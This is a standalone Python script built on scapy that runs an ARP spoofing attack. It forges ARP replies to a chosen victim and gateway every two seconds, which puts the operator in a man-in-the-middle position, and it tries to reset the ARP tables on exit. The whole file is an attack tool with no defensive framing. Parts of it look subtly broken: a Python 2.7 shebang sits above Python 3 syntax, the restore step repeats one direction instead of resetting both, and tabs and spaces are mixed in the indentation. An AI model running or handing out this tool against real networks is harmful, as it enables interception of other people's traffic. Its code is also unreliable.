#!/usr/bin/python2.7

import os
import sys
import argparse
import scapy.all as scapy
import time

class ARPSpoof:
  def __init__(self) -> None:
    try:
      self.TargetIP = None
      self.GatewayIP = None
      self.PacketsCount = 0

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def ReadArguments(self):
    try:
      parser = argparse.ArgumentParser()
      parser.add_argument(
        "-t",
        "--target",
	    dest = "victim",
	    help = "Specify Victim IP addres"
      )
      parser.add_argument(
        "-s",
        "--spoof",
        dest = "spoof",
        help = "Specify Spoofing IP addres"
      )
      options = parser.parse_args()

      if not options.victim:
        parser.error("[-] Specify an IP Address for victim --help for more details")

      if not options.spoof:
        parser.error("[-] Specify an IP Address for spoofing --help for more details")

      self.TargetIP = options.victim
      self.GatewayIP = options.spoof

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def getMAC(self, ip):
    try:
      arp_request = scapy.ARP(pdst = ip)
      broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
      arp_request_broadcast = broadcast/arp_request
      AnsweredList = scapy.srp(arp_request_broadcast,timeout=1, verbose=False)[0]

      return AnsweredList[0][1].hwsrc

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def spoof(self, target, spoof):
    try:
      dst_mac = self.getMAC(target)
      arp_respond = scapy.ARP(
        op = 2,
	    pdst = target,
	    hwdst = dst_mac,
	    psrc = spoof
      )
      # arp_respond = scapy.ARP(op="1 for request 2 for respond,pdst="victim-ip",hwdst="victim-mac",psrc="Router-ip")

      scapy.send(arp_respond, verbose=False)

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def restore(self, dst, src):
    try:
      dst_mac = self.getMAC(dst)
      src_mac = self.getMAC(src)

      arp_respond = scapy.ARP(
        op = 2,
	    pdst = dst,
	    hwdst = dst_mac,
	    psrc = src,
	    hwsrc = src_mac
      )

      scapy.send(
	    arp_respond,
	    verbose = False,
	    count = 4
      )

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def StartAttack(self):
    try:
      while True:
        self.spoof(self.TargetIP, self.GatewayIP)
        self.spoof(self.GatewayIP, self.TargetIP)

        self.PacketsCount += 2

        print("\r[+] send two packets " + str(self.PacketsCount))

        sys.stdout.flush()
        time.sleep(2)

    except KeyboardInterrupt:
      print("\n[+] Detected CTRL+C Quitting and restoring arp value please wait")
      self.restore(self.TargetIP, self.GatewayIP)
      self.restore(self.TargetIP, self.GatewayIP)
    except Exception as e:
      self.restore(self.TargetIP, self.GatewayIP)
      self.restore(self.TargetIP, self.GatewayIP)
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)


if __name__ == "__main__":
  t = ARPSpoof()
  t.ReadArguments()
  t.StartAttack()
